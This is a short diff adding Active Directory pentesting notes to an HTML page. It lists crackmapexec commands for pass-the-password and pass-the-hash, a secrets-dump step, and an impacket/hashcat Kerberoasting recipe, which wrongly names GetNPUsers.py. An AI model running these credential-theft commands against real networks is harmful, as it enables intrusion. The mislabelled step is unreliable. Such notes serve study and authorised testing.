@@ -66,7 +66,25 @@ Look on printers <br>
   Get-DomainPolicy<br>
   Get-NetUser (sometimes passwords are placed in Description) -- Get-NetUser | select description<br>
   
+  <h1> Pass the password </h1><br>
+  crackmapexec smb IP/CIDR -u user -d domain -p password <br>
+  This will loop through the IPs specified to see what devices the user can authenticate against. <br>
+  <br>
+  
+  <h1> Pass the Hash </h1><br>
+  Crackmapexec IP -u username -H hash --local-auth <br>
+  
+ <br>
+  <h1> Secrets Dump </h1> <br>
+  Any machine that allows login via SMB perform a secrets dump on the machine to dump out the local hashes should the account be a administrator <br>
 
+  <br>
+  
+  <h1> Kerboeroasting </h1><br>
+  Goal here is to get a TGS (Service Ticket) to decrypt servers account hash<br>
+  python3 /home/kali/impacket/examples/GetNPUsers.py domain/username:password -dc-ip IP -request <br>
+  Hashcat -m 13100 textfile.txt wordlist.txt <br>
+  <br>
 
 
 
